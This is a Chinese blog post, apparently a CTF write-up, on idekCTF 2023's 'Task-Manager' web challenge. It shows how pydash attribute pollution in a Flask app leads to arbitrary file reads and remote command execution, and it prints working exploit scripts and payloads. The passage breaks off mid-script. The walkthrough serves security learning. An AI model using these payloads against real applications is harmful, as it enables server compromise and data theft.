<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>IdekCTF2023 | Web(部分) - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="IdekCTF2023 | Web(部分) - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/10/IdekCTF2023%20_%20Web(%E9%83%A8%E5%88%86)/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-10T05:07:22.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>10,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">IdekCTF2023 | Web(部分)</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>参考：<br><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup">https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup</a></p>
<h1 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task-Manager"></a>Task-Manager</h1><p>考点：pydash原型链污染<br>一个事务管理器：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678364874969-eefea74f-1a44-4a30-bd8d-75763af775be.png#averageHue=%23fefdfd&clientId=ud3b2cc69-f72a-4&from=paste&height=399&id=u8726af06&name=image.png&originHeight=499&originWidth=1251&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26516&status=done&style=none&taskId=u11cdfec3-6283-4c03-b4bf-fc88810a6c8&title=&width=1000.8" alt="image.png"><br>我觉得这是最好玩的一题了，没想到吧，python也有原型链污染，因此也让我思考起了别的语言会不会也有原型链污染呢？比如Java之类的（java还是不太可能）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> taskmanager <span class="keyword">import</span> TaskManager</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">if</span> app.env == <span class="string">&#x27;yolo&#x27;</span>:</span><br><span class="line">        app.add_template_global(<span class="built_in">eval</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/manage_tasks&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manage_tasks</span>():</span><br><span class="line">    task, status = request.json.get(<span class="string">&#x27;task&#x27;</span>), request.json.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> task <span class="keyword">or</span> <span class="built_in">type</span>(task) != <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;You must provide a task name as a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(task) &gt; <span class="number">150</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Tasks may not be over 150 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> status <span class="keyword">and</span> <span class="built_in">len</span>(status) &gt; <span class="number">50</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Statuses may not be over 50 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> status:</span><br><span class="line">        tasks.complete(task)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Task marked complete!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(status) != <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your status must be a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> tasks.<span class="built_in">set</span>(task, status):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Task updated!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid task name!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/get_tasks&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tasks</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        task = request.json.get(<span class="string">&#x27;task&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> tasks.get(task)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> tasks.get_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/home.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">tasks = TaskManager()</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还有一个taskmanager.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaskManager</span>:</span><br><span class="line">    protected = [<span class="string">&quot;set&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;get_all&quot;</span>, <span class="string">&quot;__init__&quot;</span>, <span class="string">&quot;complete&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.<span class="built_in">set</span>(<span class="string">&quot;capture the flag&quot;</span>, <span class="string">&quot;incomplete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">self, task, status</span>):</span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> self.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(self, task, status)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">complete</span>(<span class="params">self, task</span>):</span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> self.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(self, task, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, task</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, task):</span><br><span class="line">            <span class="keyword">return</span> &#123;task: <span class="built_in">getattr</span>(self, task)&#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_all</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__dict__</span><br></pre></td></tr></table></figure>
<p>这里出现了一个没咋见过的库，pydash，有没有联想到nodejs里的lodash库，点进去看看：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678364651015-84e7d756-bac9-4342-beb8-44910db130b9.png#averageHue=%231e2023&clientId=ud3b2cc69-f72a-4&from=paste&height=1014&id=ub4125e35&name=image.png&originHeight=1267&originWidth=1410&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140881&status=done&style=none&taskId=u8e2dbf4c-7165-4dc2-8d3c-6cf4b8d3859&title=&width=1128" alt="image.png"><br>是不是和原型链污染一模一样，将右边的对象赋值给左边，做一个链式调用，分析一手逻辑，其实很简单，主要逻辑就在创建Task里面，因为在这里会调用pydash的set方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678365224487-39ef6653-ebc1-4858-bcec-a770ce568dd9.png#averageHue=%231f2125&clientId=ud3b2cc69-f72a-4&from=paste&height=316&id=u82d007de&name=image.png&originHeight=395&originWidth=770&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67828&status=done&style=none&taskId=u60aebd1d-9ad6-4c4a-bf74-6302fd6f9a3&title=&width=616" alt="image.png"><br>task和status都是我们可控的变量，还有需要注意的就是init方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678365246417-98874848-979b-4e3a-a029-a20336fc6124.png#averageHue=%23202225&clientId=ud3b2cc69-f72a-4&from=paste&height=117&id=uf18b93ea&name=image.png&originHeight=146&originWidth=474&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13310&status=done&style=none&taskId=u96639963-3394-43bc-80af-2a4c8b0c1c6&title=&width=379.2" alt="image.png"><br>用<code>@app.before_first_request</code>标签修饰了，代表在请求处理前，会先调用该方法，这里往模板中的全局变量添加了eval，假如添加进去了，我们就可以直接在模板标识符也就是</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="built_in">eval</span>(cmd)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>中调用eval函数执行命令，但是前提是app.env需要为yoto，也就是我们需要污染该对象<br>看了我写的python原型链污染的文章就会知道，想污染一个Flask应用，首先就得找到app对象，这里也是直接给出答案：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678366261101-6e19d385-84c5-4e55-a04d-ef163d6782f3.png#averageHue=%232c2f35&clientId=ubabef70d-f70a-4&from=paste&height=524&id=u73efd2a8&name=image.png&originHeight=655&originWidth=884&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118487&status=done&style=none&taskId=uc5ab73b6-76ce-41b3-a462-ca6d7f6f9b7&title=&width=707.2" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.__init__.__globals__[&#x27;__loader__&#x27;].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;app&#x27;].app</span><br></pre></td></tr></table></figure>
<p>一顿操作给他点到app里去，这里的moudles[‘app’]需要注意一下，因为本地pycharm起的可能是app，假如在docker里就是__main__了<br>因此到了这里也就有2种思路，其中就有非预期，先说预期解吧</p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678366494122-1f0d66d4-527b-4bd8-bc4c-fa0ebcf93d34.png#averageHue=%232b2f37&clientId=ubabef70d-f70a-4&from=paste&height=401&id=u04ac4cbe&name=image.png&originHeight=501&originWidth=927&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78461&status=done&style=none&taskId=ua4ed940d-e7f7-483f-a358-840e193d6d8&title=&width=741.6" alt="image.png"><br>首先这里面有个jinja_env属性用来控制模板语言的，可以看到其中2个属性很显眼：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678366585190-048ba092-01e9-47f4-8aaf-408763ce35c6.png#averageHue=%232e3645&clientId=ubabef70d-f70a-4&from=paste&height=77&id=ue433bb56&name=image.png&originHeight=96&originWidth=390&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13496&status=done&style=none&taskId=ub7f41dbd-fc88-41fe-9c40-08a443305bb&title=&width=312" alt="image.png"><br>也就是我们的模板语言标识符，这里是默认的，假如我们污染了这个是不是就可以使用我们自定义的标识符了<br>并且在源码中可以渲染任意文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678366685762-b2cf709f-c89d-4da9-a896-199c604b100f.png#averageHue=%23212327&clientId=ubabef70d-f70a-4&from=paste&height=123&id=uda32cb87&name=image.png&originHeight=154&originWidth=645&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16541&status=done&style=none&taskId=u99627168-6e3c-4b46-b89e-699bf4e3789&title=&width=516" alt="image.png"><br>那么现在也就是如果可以找到一个python内置文件，里面调用eval，我们就可以执行任意函数方法了，最终是在<code>/usr/local/lib/python3.8/turtle.py</code>找到了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678366747494-175a2c0d-a83c-4fbc-bea1-4db08f17a38f.png#averageHue=%23212226&clientId=ubabef70d-f70a-4&from=paste&height=138&id=u24024762&name=image.png&originHeight=172&originWidth=768&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15486&status=done&style=none&taskId=ubf879bb6-59af-442e-9c86-7aab21a88ce&title=&width=614.4" alt="image.png"><br>假如这里让模板前后标识符分别为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&quot;&quot;&#x27;]:\n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">\n</span><br></pre></td></tr></table></figure>
<p>是不是就可以执行里面的<code>eval(value)</code>了？这里直接放上出题人的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://localhost:1337&quot;</span></span><br><span class="line"><span class="comment">#base_url = &quot;https://task-manager-dc512c530573c0b4.instancer.idek.team&quot;</span></span><br><span class="line"></span><br><span class="line">hijack_start = <span class="string">&quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\n            value = &quot;&quot;&quot;</span></span><br><span class="line">hijack_end = <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payloads = &#123;</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.env&quot;</span>: <span class="string">&quot;yolo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span>: hijack_start,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;</span>: hijack_end,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>: <span class="string">&quot;ZZZ&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overwrite</span>(<span class="params">attr, value</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;task&quot;</span>: attr, <span class="string">&quot;status&quot;</span>: value&#125;</span><br><span class="line">    requests.post(base_url + <span class="string">&quot;/api/manage_tasks&quot;</span>, json=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    url = base_url + <span class="string">&quot;/../../usr/local/lib/python3.7/turtle.py&quot;</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url)</span><br><span class="line">    prep = r.prepare()</span><br><span class="line">    prep.url = url</span><br><span class="line">    r = s.send(prep)</span><br><span class="line">    flag = re.findall(<span class="string">&#x27;idek&#123;.*&#125;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> payloads.items():</span><br><span class="line">    overwrite(k, v)</span><br><span class="line"></span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure>
<p>先污染env，再污染value，最后污染标识符达到rce！<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678371092408-6c66d443-5a6c-47b3-bb3f-5b482e07fccf.png#averageHue=%234a7660&clientId=ubabef70d-f70a-4&from=paste&height=859&id=u123ab65d&name=image.png&originHeight=1074&originWidth=3463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=290417&status=done&style=none&taskId=ua8e4bc7a-654b-4773-9b44-4b309778cea&title=&width=2770.4" alt="image.png"></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>来自国外大牛的思路<br><a target="_blank" rel="noopener" href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager</a><br>大致的意思就是在模板编译的时候就污染：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678372175120-47542ac2-ce0a-49d7-b677-8f76b77beabd.png#averageHue=%232e2c2b&clientId=ubabef70d-f70a-4&from=paste&id=u30b0702c&name=image.png&originHeight=1098&originWidth=1632&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=261019&status=done&style=none&taskId=ud324cc16-1834-4607-920b-cdf76cb94ce&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678372179782-d2fcb71b-b0a9-479b-991e-5d4e37031c1b.png#averageHue=%23fcfcfc&clientId=ubabef70d-f70a-4&from=paste&id=ubdd86771&name=image.png&originHeight=670&originWidth=1988&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=110509&status=done&style=none&taskId=uf6d40f59-3998-4364-8322-40477ee8dd8&title=" alt="image.png"></p>
<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>观察dockerfile，里面有一个<code>copy . .</code>意味把dockerfile读进去了，那选手就可以读取dockerfile里的内容了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678372734887-22774cbc-e6ea-4537-b8c9-72fd12d94a51.png#averageHue=%23f5f7f8&clientId=ubabef70d-f70a-4&from=paste&height=301&id=uc5b270d7&name=image.png&originHeight=376&originWidth=1595&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30031&status=done&style=none&taskId=u66dc270d-d33e-48cf-be06-d4787ffc4b2&title=&width=1276" alt="image.png"><br>然后flag就在Dockerfile里哈哈哈</p>
<h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678372394490-baedac7b-c2cf-40b0-8d01-9ffe303ff16a.png#averageHue=%232c313a&clientId=ubabef70d-f70a-4&from=paste&height=175&id=u81eda2b2&name=image.png&originHeight=219&originWidth=856&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35151&status=done&style=none&taskId=ud9426f11-fcd4-43e3-8e95-ba82f9e1e4a&title=&width=684.8" alt="image.png"><br>在app下有一个属性叫做_static_url_path也就是设置静态资源文件夹和URL的映射的属性，假如我们在这里修改static为&#x2F;，那么访问<code>/staic/etc/passwd</code>就可以读取密码实现任意文件读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._static_folder&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>然后访问<code>/staic/Dockerfile</code>获取flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678373193921-7a2927ab-7fbd-45ed-a5b7-4ee19145b6f7.png#averageHue=%23ecebeb&clientId=ubabef70d-f70a-4&from=paste&height=646&id=ub798f589&name=image.png&originHeight=808&originWidth=1025&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33016&status=done&style=none&taskId=u73dc044d-d0eb-46db-8faa-e981e1808a0&title=&width=820" alt="image.png"></p>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>可以看看jinja模板是怎么处理目录穿越的<code>jinja2.loaders.FileSystemLoader.get_source</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678373354238-368a9dd3-6b81-44ae-8ab0-5e074a397aa1.png#averageHue=%231f2024&clientId=ubabef70d-f70a-4&from=paste&height=504&id=u54e1e8c3&name=image.png&originHeight=630&originWidth=1412&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80580&status=done&style=none&taskId=ufc03c10b-683f-425b-8866-7b0b7ae303f&title=&width=1129.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678373429763-0f829172-f31b-41e4-8ae1-6628f6bceb76.png#averageHue=%232d2c2b&clientId=ubabef70d-f70a-4&from=paste&id=uf9ff62f2&name=image.png&originHeight=720&originWidth=1314&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=138754&status=done&style=none&taskId=u8df26e22-d6b9-404b-9f87-4c6c8903077&title=" alt="image.png"><br>可以看到过滤了这个<code>..</code>，因此不能目录穿越，那我们只需污染<code>os.path.pardir</code>即可任意文件读取<br><code>&quot;task&quot;: &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;, &quot;status&quot;: &quot;foobar&quot;</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://127.0.0.1:1337&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/api/manage_tasks&#x27;</span></span><br><span class="line">exp_url  = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/../Dockerfile&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass jinja directory traversal check</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span 